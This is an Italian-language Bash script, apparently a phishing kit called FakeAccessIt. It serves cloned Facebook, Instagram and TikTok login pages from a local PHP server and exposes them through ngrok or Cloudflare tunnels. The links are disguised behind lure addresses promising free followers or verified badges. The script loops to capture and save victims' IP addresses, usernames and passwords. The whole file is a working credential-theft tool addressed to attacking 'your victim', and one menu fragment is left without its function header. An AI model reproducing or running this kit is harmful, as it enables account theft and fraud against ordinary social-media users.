#!/bin/bash

## ANSI
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} FakeAccessIt Interrotto." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} FakeAccessIt Terminato." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

banner() {
	cat <<- EOF
		${ORANGE}
		${ORANGE} .oOOOo.  o.oOOOo.   .oOOOo.   .oOOOo.  `o    O  o      O  .oOOOo.  
		${ORANGE}.O     o   o     o  .O     o. .O     o.  o   O    O    o  .O     o  
		${ORANGE}o          O     O  O       o O       o  O  O      o  O   o         
		${ORANGE}O          oOooOO.  o       O o       O  oOo        oO    o         
		${ORANGE}O   .oOOo  o     `O O       o O       o  o  o       Oo    o         
		${ORANGE}o.      O  O      o o       O o       O  O   O     o  o   O         
		${ORANGE} O.    oO  o     .O `o     O' `o     O'  o    o   O    O  `o     .o 
		${ORANGE}  `OooO'   `OooOO'   `OoooO'   `OoooO'   O     O O      o  `OoooO'  
	EOF
}

banner_small() {
	cat <<- EOF
		${ORANGE}
		${ORANGE} .oOOOo.  o.oOOOo.   .oOOOo.   .oOOOo.  `o    O  o      O  .oOOOo.  
		${ORANGE}.O     o   o     o  .O     o. .O     o.  o   O    O    o  .O     o  
		${ORANGE}o          O     O  O       o O       o  O  O      o  O   o         
		${ORANGE}O          oOooOO.  o       O o       O  oOo        oO    o         
		${ORANGE}O   .oOOo  o     `O O       o O       o  o  o       Oo    o         
		${ORANGE}o.      O  O      o o       O o       O  O   O     o  o   O         
		${ORANGE} O.    oO  o     .O `o     O' `o     O'  o    o   O    O  `o     .o 
		${ORANGE}  `OooO'   `OooOO'   `OoooO'   `OoooO'   O     O O      o  `OoooO'  
	EOF
}

dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installazione......"

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installazione di : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Installato con successo."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installazione di : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Errore nell'installazione, riprova manualmente."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Errore nell'installazione, Installa Ngrok manualmente."
		{ reset_color; exit 1; }
	fi
}

download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Errore nell'installazione, Installa Cloudflared manualmente."
		{ reset_color; exit 1; }
	fi
}

install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok installato."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installazione Ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared installato."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installazione Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}

msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Grazie per aver usato FakeAcessIt.${RESETBG}\n"
	{ reset_color; exit 0; }
}


	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleziona un opzione : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Ritorno al menù principale..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opzione invalida, riprova..."
			{ sleep 1; about; };;
	esac
}

HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Avvio server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Avvio server PHP..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} INDIRIZZO IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Salvato in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Salvato in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Attendo un nuovo login, ${BLUE}Ctrl + C ${ORANGE}per terminare l'attacco. "
}

capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Attendo un nuovo login, ${BLUE}Ctrl + C ${ORANGE}per terminare l'attacco..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} INDIRIZZO IP TROVATO !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} CREDENZIALI TROVATE! !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inizializzazione... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Avvio Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Indirizzo 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Indirizzo 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}



start_cloudflared() { 
        rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inizializzazione... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Avvio Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Indirizzo 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Indirizzo 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}

tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleziona che servizio usare : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_ngrok;;
		2 | 02)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opzione invalida, riprova..."
			{ sleep 1; tunnel_menu; };;
	esac
}

site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook Fake Login

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleziona un opzione : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='http://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opzione invalida, riprova..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Instagram Fake Login
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram Verifica Account

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleziona un opzione : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_verify"
			mask='http://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opzione invalida, riprova..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}


main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     
		${RED}[${WHITE}03${RED}]${ORANGE} Tiktok        

         ${RED}[${WHITE}00${RED}]${ORANGE} Esci

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleziona un opzione : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			website="tiktok"
			mask='http://tiktok-free-liker'
			tunnel_menu;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opzione invalida, riprova..."
			{ sleep 1; main_menu; };;
	
	esac
}

kill_pid
dependencies
install_ngrok
install_cloudflared
main_menu
